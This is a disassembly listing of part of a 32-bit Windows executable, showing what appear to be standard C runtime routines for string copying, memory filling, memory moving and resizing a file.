  40666f:	a1 54 bf 40 00       	mov    0x40bf54,%eax
  406674:	85 c0                	test   %eax,%eax
  406676:	74 05                	je     0x40667d
  406678:	53                   	push   %ebx
  406679:	ff d0                	call   *%eax
  40667b:	8b d8                	mov    %eax,%ebx
  40667d:	ff 74 24 18          	push   0x18(%esp)
  406681:	ff 74 24 18          	push   0x18(%esp)
  406685:	ff 74 24 18          	push   0x18(%esp)
  406689:	53                   	push   %ebx
  40668a:	ff 15 4c bf 40 00    	call   *0x40bf4c
  406690:	5f                   	pop    %edi
  406691:	5e                   	pop    %esi
  406692:	5b                   	pop    %ebx
  406693:	c3                   	ret
  406694:	33 c0                	xor    %eax,%eax
  406696:	eb f8                	jmp    0x406690
  406698:	cc                   	int3
  406699:	cc                   	int3
  40669a:	cc                   	int3
  40669b:	cc                   	int3
  40669c:	cc                   	int3
  40669d:	cc                   	int3
  40669e:	cc                   	int3
  40669f:	cc                   	int3
  4066a0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4066a4:	57                   	push   %edi
  4066a5:	85 c9                	test   %ecx,%ecx
  4066a7:	74 7a                	je     0x406723
  4066a9:	56                   	push   %esi
  4066aa:	53                   	push   %ebx
  4066ab:	8b d9                	mov    %ecx,%ebx
  4066ad:	8b 74 24 14          	mov    0x14(%esp),%esi
  4066b1:	f7 c6 03 00 00 00    	test   $0x3,%esi
  4066b7:	8b 7c 24 10          	mov    0x10(%esp),%edi
  4066bb:	75 07                	jne    0x4066c4
  4066bd:	c1 e9 02             	shr    $0x2,%ecx
  4066c0:	75 6f                	jne    0x406731
  4066c2:	eb 21                	jmp    0x4066e5
  4066c4:	8a 06                	mov    (%esi),%al
  4066c6:	46                   	inc    %esi
  4066c7:	88 07                	mov    %al,(%edi)
  4066c9:	47                   	inc    %edi
  4066ca:	49                   	dec    %ecx
  4066cb:	74 25                	je     0x4066f2
  4066cd:	84 c0                	test   %al,%al
  4066cf:	74 29                	je     0x4066fa
  4066d1:	f7 c6 03 00 00 00    	test   $0x3,%esi
  4066d7:	75 eb                	jne    0x4066c4
  4066d9:	8b d9                	mov    %ecx,%ebx
  4066db:	c1 e9 02             	shr    $0x2,%ecx
  4066de:	75 51                	jne    0x406731
  4066e0:	83 e3 03             	and    $0x3,%ebx
  4066e3:	74 0d                	je     0x4066f2
  4066e5:	8a 06                	mov    (%esi),%al
  4066e7:	46                   	inc    %esi
  4066e8:	88 07                	mov    %al,(%edi)
  4066ea:	47                   	inc    %edi
  4066eb:	84 c0                	test   %al,%al
  4066ed:	74 2f                	je     0x40671e
  4066ef:	4b                   	dec    %ebx
  4066f0:	75 f3                	jne    0x4066e5
  4066f2:	8b 44 24 10          	mov    0x10(%esp),%eax
  4066f6:	5b                   	pop    %ebx
  4066f7:	5e                   	pop    %esi
  4066f8:	5f                   	pop    %edi
  4066f9:	c3                   	ret
  4066fa:	f7 c7 03 00 00 00    	test   $0x3,%edi
  406700:	74 12                	je     0x406714
  406702:	88 07                	mov    %al,(%edi)
  406704:	47                   	inc    %edi
  406705:	49                   	dec    %ecx
  406706:	0f 84 8a 00 00 00    	je     0x406796
  40670c:	f7 c7 03 00 00 00    	test   $0x3,%edi
  406712:	75 ee                	jne    0x406702
  406714:	8b d9                	mov    %ecx,%ebx
  406716:	c1 e9 02             	shr    $0x2,%ecx
  406719:	75 6c                	jne    0x406787
  40671b:	88 07                	mov    %al,(%edi)
  40671d:	47                   	inc    %edi
  40671e:	4b                   	dec    %ebx
  40671f:	75 fa                	jne    0x40671b
  406721:	5b                   	pop    %ebx
  406722:	5e                   	pop    %esi
  406723:	8b 44 24 08          	mov    0x8(%esp),%eax
  406727:	5f                   	pop    %edi
  406728:	c3                   	ret
  406729:	89 17                	mov    %edx,(%edi)
  40672b:	83 c7 04             	add    $0x4,%edi
  40672e:	49                   	dec    %ecx
  40672f:	74 af                	je     0x4066e0
  406731:	ba ff fe fe 7e       	mov    $0x7efefeff,%edx
  406736:	8b 06                	mov    (%esi),%eax
  406738:	03 d0                	add    %eax,%edx
  40673a:	83 f0 ff             	xor    $0xffffffff,%eax
  40673d:	33 c2                	xor    %edx,%eax
  40673f:	8b 16                	mov    (%esi),%edx
  406741:	83 c6 04             	add    $0x4,%esi
  406744:	a9 00 01 01 81       	test   $0x81010100,%eax
  406749:	74 de                	je     0x406729
  40674b:	84 d2                	test   %dl,%dl
  40674d:	74 2c                	je     0x40677b
  40674f:	84 f6                	test   %dh,%dh
  406751:	74 1e                	je     0x406771
  406753:	f7 c2 00 00 ff 00    	test   $0xff0000,%edx
  406759:	74 0c                	je     0x406767
  40675b:	f7 c2 00 00 00 ff    	test   $0xff000000,%edx
  406761:	75 c6                	jne    0x406729
  406763:	89 17                	mov    %edx,(%edi)
  406765:	eb 18                	jmp    0x40677f
  406767:	81 e2 ff ff 00 00    	and    $0xffff,%edx
  40676d:	89 17                	mov    %edx,(%edi)
  40676f:	eb 0e                	jmp    0x40677f
  406771:	81 e2 ff 00 00 00    	and    $0xff,%edx
  406777:	89 17                	mov    %edx,(%edi)
  406779:	eb 04                	jmp    0x40677f
  40677b:	33 d2                	xor    %edx,%edx
  40677d:	89 17                	mov    %edx,(%edi)
  40677f:	83 c7 04             	add    $0x4,%edi
  406782:	33 c0                	xor    %eax,%eax
  406784:	49                   	dec    %ecx
  406785:	74 0a                	je     0x406791
  406787:	33 c0                	xor    %eax,%eax
  406789:	89 07                	mov    %eax,(%edi)
  40678b:	83 c7 04             	add    $0x4,%edi
  40678e:	49                   	dec    %ecx
  40678f:	75 f8                	jne    0x406789
  406791:	83 e3 03             	and    $0x3,%ebx
  406794:	75 85                	jne    0x40671b
  406796:	8b 44 24 10          	mov    0x10(%esp),%eax
  40679a:	5b                   	pop    %ebx
  40679b:	5e                   	pop    %esi
  40679c:	5f                   	pop    %edi
  40679d:	c3                   	ret
  40679e:	a1 5c bf 40 00       	mov    0x40bf5c,%eax
  4067a3:	85 c0                	test   %eax,%eax
  4067a5:	74 0f                	je     0x4067b6
  4067a7:	ff 74 24 04          	push   0x4(%esp)
  4067ab:	ff d0                	call   *%eax
  4067ad:	85 c0                	test   %eax,%eax
  4067af:	59                   	pop    %ecx
  4067b0:	74 04                	je     0x4067b6
  4067b2:	6a 01                	push   $0x1
  4067b4:	58                   	pop    %eax
  4067b5:	c3                   	ret
  4067b6:	33 c0                	xor    %eax,%eax
  4067b8:	c3                   	ret
  4067b9:	6a 02                	push   $0x2
  4067bb:	e8 f0 ba ff ff       	call   0x4022b0
  4067c0:	59                   	pop    %ecx
  4067c1:	c3                   	ret
  4067c2:	cc                   	int3
  4067c3:	cc                   	int3
  4067c4:	cc                   	int3
  4067c5:	cc                   	int3
  4067c6:	cc                   	int3
  4067c7:	cc                   	int3
  4067c8:	cc                   	int3
  4067c9:	cc                   	int3
  4067ca:	cc                   	int3
  4067cb:	cc                   	int3
  4067cc:	cc                   	int3
  4067cd:	cc                   	int3
  4067ce:	cc                   	int3
  4067cf:	cc                   	int3
  4067d0:	8b 54 24 0c          	mov    0xc(%esp),%edx
  4067d4:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4067d8:	85 d2                	test   %edx,%edx
  4067da:	74 47                	je     0x406823
  4067dc:	33 c0                	xor    %eax,%eax
  4067de:	8a 44 24 08          	mov    0x8(%esp),%al
  4067e2:	57                   	push   %edi
  4067e3:	8b f9                	mov    %ecx,%edi
  4067e5:	83 fa 04             	cmp    $0x4,%edx
  4067e8:	72 2d                	jb     0x406817
  4067ea:	f7 d9                	neg    %ecx
  4067ec:	83 e1 03             	and    $0x3,%ecx
  4067ef:	74 08                	je     0x4067f9
  4067f1:	2b d1                	sub    %ecx,%edx
  4067f3:	88 07                	mov    %al,(%edi)
  4067f5:	47                   	inc    %edi
  4067f6:	49                   	dec    %ecx
  4067f7:	75 fa                	jne    0x4067f3
  4067f9:	8b c8                	mov    %eax,%ecx
  4067fb:	c1 e0 08             	shl    $0x8,%eax
  4067fe:	03 c1                	add    %ecx,%eax
  406800:	8b c8                	mov    %eax,%ecx
  406802:	c1 e0 10             	shl    $0x10,%eax
  406805:	03 c1                	add    %ecx,%eax
  406807:	8b ca                	mov    %edx,%ecx
  406809:	83 e2 03             	and    $0x3,%edx
  40680c:	c1 e9 02             	shr    $0x2,%ecx
  40680f:	74 06                	je     0x406817
  406811:	f3 ab                	rep stos %eax,%es:(%edi)
  406813:	85 d2                	test   %edx,%edx
  406815:	74 06                	je     0x40681d
  406817:	88 07                	mov    %al,(%edi)
  406819:	47                   	inc    %edi
  40681a:	4a                   	dec    %edx
  40681b:	75 fa                	jne    0x406817
  40681d:	8b 44 24 08          	mov    0x8(%esp),%eax
  406821:	5f                   	pop    %edi
  406822:	c3                   	ret
  406823:	8b 44 24 04          	mov    0x4(%esp),%eax
  406827:	c3                   	ret
  406828:	cc                   	int3
  406829:	cc                   	int3
  40682a:	cc                   	int3
  40682b:	cc                   	int3
  40682c:	cc                   	int3
  40682d:	cc                   	int3
  40682e:	cc                   	int3
  40682f:	cc                   	int3
  406830:	55                   	push   %ebp
  406831:	8b ec                	mov    %esp,%ebp
  406833:	57                   	push   %edi
  406834:	56                   	push   %esi
  406835:	8b 75 0c             	mov    0xc(%ebp),%esi
  406838:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40683b:	8b 7d 08             	mov    0x8(%ebp),%edi
  40683e:	8b c1                	mov    %ecx,%eax
  406840:	8b d1                	mov    %ecx,%edx
  406842:	03 c6                	add    %esi,%eax
  406844:	3b fe                	cmp    %esi,%edi
  406846:	76 08                	jbe    0x406850
  406848:	3b f8                	cmp    %eax,%edi
  40684a:	0f 82 78 01 00 00    	jb     0x4069c8
  406850:	f7 c7 03 00 00 00    	test   $0x3,%edi
  406856:	75 14                	jne    0x40686c
  406858:	c1 e9 02             	shr    $0x2,%ecx
  40685b:	83 e2 03             	and    $0x3,%edx
  40685e:	83 f9 08             	cmp    $0x8,%ecx
  406861:	72 29                	jb     0x40688c
  406863:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406865:	ff 24 95 78 69 40 00 	jmp    *0x406978(,%edx,4)
  40686c:	8b c7                	mov    %edi,%eax
  40686e:	ba 03 00 00 00       	mov    $0x3,%edx
  406873:	83 e9 04             	sub    $0x4,%ecx
  406876:	72 0c                	jb     0x406884
  406878:	83 e0 03             	and    $0x3,%eax
  40687b:	03 c8                	add    %eax,%ecx
  40687d:	ff 24 85 90 68 40 00 	jmp    *0x406890(,%eax,4)
  406884:	ff 24 8d 88 69 40 00 	jmp    *0x406988(,%ecx,4)
  40688b:	90                   	nop
  40688c:	ff 24 8d 0c 69 40 00 	jmp    *0x40690c(,%ecx,4)
  406893:	90                   	nop
  406894:	a0 68 40 00 cc       	mov    0xcc004068,%al
  406899:	68 40 00 f0 68       	push   $0x68f00040
  40689e:	40                   	inc    %eax
  40689f:	00 23                	add    %ah,(%ebx)
  4068a1:	d1 8a 06 88 07 8a    	rorl   $1,-0x75f877fa(%edx)
  4068a7:	46                   	inc    %esi
  4068a8:	01 88 47 01 8a 46    	add    %ecx,0x468a0147(%eax)
  4068ae:	02 c1                	add    %cl,%al
  4068b0:	e9 02 88 47 02       	jmp    0x287f0b7
  4068b5:	83 c6 03             	add    $0x3,%esi
  4068b8:	83 c7 03             	add    $0x3,%edi
  4068bb:	83 f9 08             	cmp    $0x8,%ecx
  4068be:	72 cc                	jb     0x40688c
  4068c0:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4068c2:	ff 24 95 78 69 40 00 	jmp    *0x406978(,%edx,4)
  4068c9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4068cc:	23 d1                	and    %ecx,%edx
  4068ce:	8a 06                	mov    (%esi),%al
  4068d0:	88 07                	mov    %al,(%edi)
  4068d2:	8a 46 01             	mov    0x1(%esi),%al
  4068d5:	c1 e9 02             	shr    $0x2,%ecx
  4068d8:	88 47 01             	mov    %al,0x1(%edi)
  4068db:	83 c6 02             	add    $0x2,%esi
  4068de:	83 c7 02             	add    $0x2,%edi
  4068e1:	83 f9 08             	cmp    $0x8,%ecx
  4068e4:	72 a6                	jb     0x40688c
  4068e6:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4068e8:	ff 24 95 78 69 40 00 	jmp    *0x406978(,%edx,4)
  4068ef:	90                   	nop
  4068f0:	23 d1                	and    %ecx,%edx
  4068f2:	8a 06                	mov    (%esi),%al
  4068f4:	88 07                	mov    %al,(%edi)
  4068f6:	46                   	inc    %esi
  4068f7:	c1 e9 02             	shr    $0x2,%ecx
  4068fa:	47                   	inc    %edi
  4068fb:	83 f9 08             	cmp    $0x8,%ecx
  4068fe:	72 8c                	jb     0x40688c
  406900:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406902:	ff 24 95 78 69 40 00 	jmp    *0x406978(,%edx,4)
  406909:	8d 49 00             	lea    0x0(%ecx),%ecx
  40690c:	6f                   	outsl  %ds:(%esi),(%dx)
  40690d:	69 40 00 5c 69 40 00 	imul   $0x40695c,0x0(%eax),%eax
  406914:	54                   	push   %esp
  406915:	69 40 00 4c 69 40 00 	imul   $0x40694c,0x0(%eax),%eax
  40691c:	44                   	inc    %esp
  40691d:	69 40 00 3c 69 40 00 	imul   $0x40693c,0x0(%eax),%eax
  406924:	34 69                	xor    $0x69,%al
  406926:	40                   	inc    %eax
  406927:	00 2c 69             	add    %ch,(%ecx,%ebp,2)
  40692a:	40                   	inc    %eax
  40692b:	00 8b 44 8e e4 89    	add    %cl,-0x761b71bc(%ebx)
  406931:	44                   	inc    %esp
  406932:	8f                   	(bad)
  406933:	e4 8b                	in     $0x8b,%al
  406935:	44                   	inc    %esp
  406936:	8e e8                	mov    %eax,%gs
  406938:	89 44 8f e8          	mov    %eax,-0x18(%edi,%ecx,4)
  40693c:	8b 44 8e ec          	mov    -0x14(%esi,%ecx,4),%eax
  406940:	89 44 8f ec          	mov    %eax,-0x14(%edi,%ecx,4)
  406944:	8b 44 8e f0          	mov    -0x10(%esi,%ecx,4),%eax
  406948:	89 44 8f f0          	mov    %eax,-0x10(%edi,%ecx,4)
  40694c:	8b 44 8e f4          	mov    -0xc(%esi,%ecx,4),%eax
  406950:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  406954:	8b 44 8e f8          	mov    -0x8(%esi,%ecx,4),%eax
  406958:	89 44 8f f8          	mov    %eax,-0x8(%edi,%ecx,4)
  40695c:	8b 44 8e fc          	mov    -0x4(%esi,%ecx,4),%eax
  406960:	89 44 8f fc          	mov    %eax,-0x4(%edi,%ecx,4)
  406964:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  40696b:	03 f0                	add    %eax,%esi
  40696d:	03 f8                	add    %eax,%edi
  40696f:	ff 24 95 78 69 40 00 	jmp    *0x406978(,%edx,4)
  406976:	8b ff                	mov    %edi,%edi
  406978:	88 69 40             	mov    %ch,0x40(%ecx)
  40697b:	00 90 69 40 00 9c    	add    %dl,-0x63ffbf97(%eax)
  406981:	69 40 00 b0 69 40 00 	imul   $0x4069b0,0x0(%eax),%eax
  406988:	8b 45 08             	mov    0x8(%ebp),%eax
  40698b:	5e                   	pop    %esi
  40698c:	5f                   	pop    %edi
  40698d:	c9                   	leave
  40698e:	c3                   	ret
  40698f:	90                   	nop
  406990:	8a 06                	mov    (%esi),%al
  406992:	88 07                	mov    %al,(%edi)
  406994:	8b 45 08             	mov    0x8(%ebp),%eax
  406997:	5e                   	pop    %esi
  406998:	5f                   	pop    %edi
  406999:	c9                   	leave
  40699a:	c3                   	ret
  40699b:	90                   	nop
  40699c:	8a 06                	mov    (%esi),%al
  40699e:	88 07                	mov    %al,(%edi)
  4069a0:	8a 46 01             	mov    0x1(%esi),%al
  4069a3:	88 47 01             	mov    %al,0x1(%edi)
  4069a6:	8b 45 08             	mov    0x8(%ebp),%eax
  4069a9:	5e                   	pop    %esi
  4069aa:	5f                   	pop    %edi
  4069ab:	c9                   	leave
  4069ac:	c3                   	ret
  4069ad:	8d 49 00             	lea    0x0(%ecx),%ecx
  4069b0:	8a 06                	mov    (%esi),%al
  4069b2:	88 07                	mov    %al,(%edi)
  4069b4:	8a 46 01             	mov    0x1(%esi),%al
  4069b7:	88 47 01             	mov    %al,0x1(%edi)
  4069ba:	8a 46 02             	mov    0x2(%esi),%al
  4069bd:	88 47 02             	mov    %al,0x2(%edi)
  4069c0:	8b 45 08             	mov    0x8(%ebp),%eax
  4069c3:	5e                   	pop    %esi
  4069c4:	5f                   	pop    %edi
  4069c5:	c9                   	leave
  4069c6:	c3                   	ret
  4069c7:	90                   	nop
  4069c8:	8d 74 31 fc          	lea    -0x4(%ecx,%esi,1),%esi
  4069cc:	8d 7c 39 fc          	lea    -0x4(%ecx,%edi,1),%edi
  4069d0:	f7 c7 03 00 00 00    	test   $0x3,%edi
  4069d6:	75 24                	jne    0x4069fc
  4069d8:	c1 e9 02             	shr    $0x2,%ecx
  4069db:	83 e2 03             	and    $0x3,%edx
  4069de:	83 f9 08             	cmp    $0x8,%ecx
  4069e1:	72 0d                	jb     0x4069f0
  4069e3:	fd                   	std
  4069e4:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4069e6:	fc                   	cld
  4069e7:	ff 24 95 10 6b 40 00 	jmp    *0x406b10(,%edx,4)
  4069ee:	8b ff                	mov    %edi,%edi
  4069f0:	f7 d9                	neg    %ecx
  4069f2:	ff 24 8d c0 6a 40 00 	jmp    *0x406ac0(,%ecx,4)
  4069f9:	8d 49 00             	lea    0x0(%ecx),%ecx
  4069fc:	8b c7                	mov    %edi,%eax
  4069fe:	ba 03 00 00 00       	mov    $0x3,%edx
  406a03:	83 f9 04             	cmp    $0x4,%ecx
  406a06:	72 0c                	jb     0x406a14
  406a08:	83 e0 03             	and    $0x3,%eax
  406a0b:	2b c8                	sub    %eax,%ecx
  406a0d:	ff 24 85 18 6a 40 00 	jmp    *0x406a18(,%eax,4)
  406a14:	ff 24 8d 10 6b 40 00 	jmp    *0x406b10(,%ecx,4)
  406a1b:	90                   	nop
  406a1c:	28 6a 40             	sub    %ch,0x40(%edx)
  406a1f:	00 48 6a             	add    %cl,0x6a(%eax)
  406a22:	40                   	inc    %eax
  406a23:	00 70 6a             	add    %dh,0x6a(%eax)
  406a26:	40                   	inc    %eax
  406a27:	00 8a 46 03 23 d1    	add    %cl,-0x2edcfcba(%edx)
  406a2d:	88 47 03             	mov    %al,0x3(%edi)
  406a30:	4e                   	dec    %esi
  406a31:	c1 e9 02             	shr    $0x2,%ecx
  406a34:	4f                   	dec    %edi
  406a35:	83 f9 08             	cmp    $0x8,%ecx
  406a38:	72 b6                	jb     0x4069f0
  406a3a:	fd                   	std
  406a3b:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406a3d:	fc                   	cld
  406a3e:	ff 24 95 10 6b 40 00 	jmp    *0x406b10(,%edx,4)
  406a45:	8d 49 00             	lea    0x0(%ecx),%ecx
  406a48:	8a 46 03             	mov    0x3(%esi),%al
  406a4b:	23 d1                	and    %ecx,%edx
  406a4d:	88 47 03             	mov    %al,0x3(%edi)
  406a50:	8a 46 02             	mov    0x2(%esi),%al
  406a53:	c1 e9 02             	shr    $0x2,%ecx
  406a56:	88 47 02             	mov    %al,0x2(%edi)
  406a59:	83 ee 02             	sub    $0x2,%esi
  406a5c:	83 ef 02             	sub    $0x2,%edi
  406a5f:	83 f9 08             	cmp    $0x8,%ecx
  406a62:	72 8c                	jb     0x4069f0
  406a64:	fd                   	std
  406a65:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406a67:	fc                   	cld
  406a68:	ff 24 95 10 6b 40 00 	jmp    *0x406b10(,%edx,4)
  406a6f:	90                   	nop
  406a70:	8a 46 03             	mov    0x3(%esi),%al
  406a73:	23 d1                	and    %ecx,%edx
  406a75:	88 47 03             	mov    %al,0x3(%edi)
  406a78:	8a 46 02             	mov    0x2(%esi),%al
  406a7b:	88 47 02             	mov    %al,0x2(%edi)
  406a7e:	8a 46 01             	mov    0x1(%esi),%al
  406a81:	c1 e9 02             	shr    $0x2,%ecx
  406a84:	88 47 01             	mov    %al,0x1(%edi)
  406a87:	83 ee 03             	sub    $0x3,%esi
  406a8a:	83 ef 03             	sub    $0x3,%edi
  406a8d:	83 f9 08             	cmp    $0x8,%ecx
  406a90:	0f 82 5a ff ff ff    	jb     0x4069f0
  406a96:	fd                   	std
  406a97:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406a99:	fc                   	cld
  406a9a:	ff 24 95 10 6b 40 00 	jmp    *0x406b10(,%edx,4)
  406aa1:	8d 49 00             	lea    0x0(%ecx),%ecx
  406aa4:	c4 6a 40             	les    0x40(%edx),%ebp
  406aa7:	00 cc                	add    %cl,%ah
  406aa9:	6a 40                	push   $0x40
  406aab:	00 d4                	add    %dl,%ah
  406aad:	6a 40                	push   $0x40
  406aaf:	00 dc                	add    %bl,%ah
  406ab1:	6a 40                	push   $0x40
  406ab3:	00 e4                	add    %ah,%ah
  406ab5:	6a 40                	push   $0x40
  406ab7:	00 ec                	add    %ch,%ah
  406ab9:	6a 40                	push   $0x40
  406abb:	00 f4                	add    %dh,%ah
  406abd:	6a 40                	push   $0x40
  406abf:	00 07                	add    %al,(%edi)
  406ac1:	6b 40 00 8b          	imul   $0xffffff8b,0x0(%eax),%eax
  406ac5:	44                   	inc    %esp
  406ac6:	8e 1c 89             	mov    (%ecx,%ecx,4),%ds
  406ac9:	44                   	inc    %esp
  406aca:	8f                   	(bad)
  406acb:	1c 8b                	sbb    $0x8b,%al
  406acd:	44                   	inc    %esp
  406ace:	8e 18                	mov    (%eax),%ds
  406ad0:	89 44 8f 18          	mov    %eax,0x18(%edi,%ecx,4)
  406ad4:	8b 44 8e 14          	mov    0x14(%esi,%ecx,4),%eax
  406ad8:	89 44 8f 14          	mov    %eax,0x14(%edi,%ecx,4)
  406adc:	8b 44 8e 10          	mov    0x10(%esi,%ecx,4),%eax
  406ae0:	89 44 8f 10          	mov    %eax,0x10(%edi,%ecx,4)
  406ae4:	8b 44 8e 0c          	mov    0xc(%esi,%ecx,4),%eax
  406ae8:	89 44 8f 0c          	mov    %eax,0xc(%edi,%ecx,4)
  406aec:	8b 44 8e 08          	mov    0x8(%esi,%ecx,4),%eax
  406af0:	89 44 8f 08          	mov    %eax,0x8(%edi,%ecx,4)
  406af4:	8b 44 8e 04          	mov    0x4(%esi,%ecx,4),%eax
  406af8:	89 44 8f 04          	mov    %eax,0x4(%edi,%ecx,4)
  406afc:	8d 04 8d 00 00 00 00 	lea    0x0(,%ecx,4),%eax
  406b03:	03 f0                	add    %eax,%esi
  406b05:	03 f8                	add    %eax,%edi
  406b07:	ff 24 95 10 6b 40 00 	jmp    *0x406b10(,%edx,4)
  406b0e:	8b ff                	mov    %edi,%edi
  406b10:	20 6b 40             	and    %ch,0x40(%ebx)
  406b13:	00 28                	add    %ch,(%eax)
  406b15:	6b 40 00 38          	imul   $0x38,0x0(%eax),%eax
  406b19:	6b 40 00 4c          	imul   $0x4c,0x0(%eax),%eax
  406b1d:	6b 40 00 8b          	imul   $0xffffff8b,0x0(%eax),%eax
  406b21:	45                   	inc    %ebp
  406b22:	08 5e 5f             	or     %bl,0x5f(%esi)
  406b25:	c9                   	leave
  406b26:	c3                   	ret
  406b27:	90                   	nop
  406b28:	8a 46 03             	mov    0x3(%esi),%al
  406b2b:	88 47 03             	mov    %al,0x3(%edi)
  406b2e:	8b 45 08             	mov    0x8(%ebp),%eax
  406b31:	5e                   	pop    %esi
  406b32:	5f                   	pop    %edi
  406b33:	c9                   	leave
  406b34:	c3                   	ret
  406b35:	8d 49 00             	lea    0x0(%ecx),%ecx
  406b38:	8a 46 03             	mov    0x3(%esi),%al
  406b3b:	88 47 03             	mov    %al,0x3(%edi)
  406b3e:	8a 46 02             	mov    0x2(%esi),%al
  406b41:	88 47 02             	mov    %al,0x2(%edi)
  406b44:	8b 45 08             	mov    0x8(%ebp),%eax
  406b47:	5e                   	pop    %esi
  406b48:	5f                   	pop    %edi
  406b49:	c9                   	leave
  406b4a:	c3                   	ret
  406b4b:	90                   	nop
  406b4c:	8a 46 03             	mov    0x3(%esi),%al
  406b4f:	88 47 03             	mov    %al,0x3(%edi)
  406b52:	8a 46 02             	mov    0x2(%esi),%al
  406b55:	88 47 02             	mov    %al,0x2(%edi)
  406b58:	8a 46 01             	mov    0x1(%esi),%al
  406b5b:	88 47 01             	mov    %al,0x1(%edi)
  406b5e:	8b 45 08             	mov    0x8(%ebp),%eax
  406b61:	5e                   	pop    %esi
  406b62:	5f                   	pop    %edi
  406b63:	c9                   	leave
  406b64:	c3                   	ret
  406b65:	55                   	push   %ebp
  406b66:	8b ec                	mov    %esp,%ebp
  406b68:	b8 00 10 00 00       	mov    $0x1000,%eax
  406b6d:	e8 6e fa ff ff       	call   0x4065e0
  406b72:	53                   	push   %ebx
  406b73:	8b 5d 08             	mov    0x8(%ebp),%ebx
  406b76:	56                   	push   %esi
  406b77:	33 f6                	xor    %esi,%esi
  406b79:	3b 1d e0 c2 40 00    	cmp    0x40c2e0,%ebx
  406b7f:	0f 83 15 01 00 00    	jae    0x406c9a
  406b85:	8b c3                	mov    %ebx,%eax
  406b87:	8b cb                	mov    %ebx,%ecx
  406b89:	c1 f8 05             	sar    $0x5,%eax
  406b8c:	83 e1 1f             	and    $0x1f,%ecx
  406b8f:	8b 04 85 e0 c1 40 00 	mov    0x40c1e0(,%eax,4),%eax
  406b96:	f6 44 c8 04 01       	testb  $0x1,0x4(%eax,%ecx,8)
  406b9b:	0f 84 f9 00 00 00    	je     0x406c9a
  406ba1:	6a 01                	push   $0x1
  406ba3:	56                   	push   %esi
  406ba4:	53                   	push   %ebx
  406ba5:	e8 3b c2 ff ff       	call   0x402de5
  406baa:	83 c4 0c             	add    $0xc,%esp
  406bad:	83 f8 ff             	cmp    $0xffffffff,%eax
  406bb0:	89 45 08             	mov    %eax,0x8(%ebp)
  406bb3:	0f 84 eb 00 00 00    	je     0x406ca4
  406bb9:	6a 02                	push   $0x2
  406bbb:	56                   	push   %esi
  406bbc:	53                   	push   %ebx
  406bbd:	e8 23 c2 ff ff       	call   0x402de5
  406bc2:	83 c4 0c             	add    $0xc,%esp
  406bc5:	83 f8 ff             	cmp    $0xffffffff,%eax
  406bc8:	0f 84 d6 00 00 00    	je     0x406ca4
  406bce:	57                   	push   %edi
  406bcf:	8b 7d 0c             	mov    0xc(%ebp),%edi
  406bd2:	2b f8                	sub    %eax,%edi
  406bd4:	85 ff                	test   %edi,%edi
  406bd6:	7e 6f                	jle    0x406c47
  406bd8:	68 00 10 00 00       	push   $0x1000
  406bdd:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  406be3:	56                   	push   %esi
  406be4:	50                   	push   %eax
  406be5:	e8 e6 fb ff ff       	call   0x4067d0
  406bea:	68 00 80 00 00       	push   $0x8000
  406bef:	53                   	push   %ebx
  406bf0:	e8 85 07 00 00       	call   0x40737a
  406bf5:	83 c4 14             	add    $0x14,%esp
  406bf8:	89 45 0c             	mov    %eax,0xc(%ebp)
  406bfb:	b8 00 10 00 00       	mov    $0x1000,%eax
  406c00:	3b f8                	cmp    %eax,%edi
  406c02:	7d 02                	jge    0x406c06
  406c04:	8b c7                	mov    %edi,%eax
  406c06:	50                   	push   %eax
  406c07:	8d 85 00 f0 ff ff    	lea    -0x1000(%ebp),%eax
  406c0d:	50                   	push   %eax
  406c0e:	53                   	push   %ebx
  406c0f:	e8 eb da ff ff       	call   0x4046ff
  406c14:	83 c4 0c             	add    $0xc,%esp
  406c17:	83 f8 ff             	cmp    $0xffffffff,%eax
  406c1a:	74 08                	je     0x406c24
  406c1c:	2b f8                	sub    %eax,%edi
  406c1e:	85 ff                	test   %edi,%edi
  406c20:	7e 18                	jle    0x406c3a
  406c22:	eb d7                	jmp    0x406bfb
  406c24:	83 3d e8 bd 40 00 05 	cmpl   $0x5,0x40bde8
  406c2b:	75 0a                	jne    0x406c37
  406c2d:	c7 05 e4 bd 40 00 0d 	movl   $0xd,0x40bde4
  406c34:	00 00 00 
  406c37:	83 ce ff             	or     $0xffffffff,%esi
  406c3a:	ff 75 0c             	push   0xc(%ebp)
  406c3d:	53                   	push   %ebx
  406c3e:	e8 37 07 00 00       	call   0x40737a
  406c43:	59                   	pop    %ecx
  406c44:	59                   	pop    %ecx
  406c45:	eb 40                	jmp    0x406c87
  406c47:	7d 3e                	jge    0x406c87
  406c49:	6a 00                	push   $0x0
  406c4b:	ff 75 0c             	push   0xc(%ebp)
  406c4e:	53                   	push   %ebx
  406c4f:	e8 91 c1 ff ff       	call   0x402de5
  406c54:	53                   	push   %ebx
  406c55:	e8 11 da ff ff       	call   0x40466b
  406c5a:	83 c4 10             	add    $0x10,%esp
  406c5d:	50                   	push   %eax
  406c5e:	ff 15 34 80 40 00    	call   *0x408034
  406c64:	8b f0                	mov    %eax,%esi
  406c66:	f7 de                	neg    %esi
  406c68:	1b f6                	sbb    %esi,%esi
  406c6a:	f7 de                	neg    %esi
  406c6c:	4e                   	dec    %esi
  406c6d:	83 fe ff             	cmp    $0xffffffff,%esi
  406c70:	75 15                	jne    0x406c87
  406c72:	c7 05 e4 bd 40 00 0d 	movl   $0xd,0x40bde4
  406c79:	00 00 00 
  406c7c:	ff 15 60 80 40 00    	call   *0x408060
  406c82:	a3 e8 bd 40 00       	mov    %eax,0x40bde8
  406c87:	6a 00                	push   $0x0
  406c89:	ff 75 08             	push   0x8(%ebp)
  406c8c:	53                   	push   %ebx
  406c8d:	e8 53 c1 ff ff       	call   0x402de5
  406c92:	83 c4 0c             	add    $0xc,%esp
  406c95:	8b c6                	mov    %esi,%eax
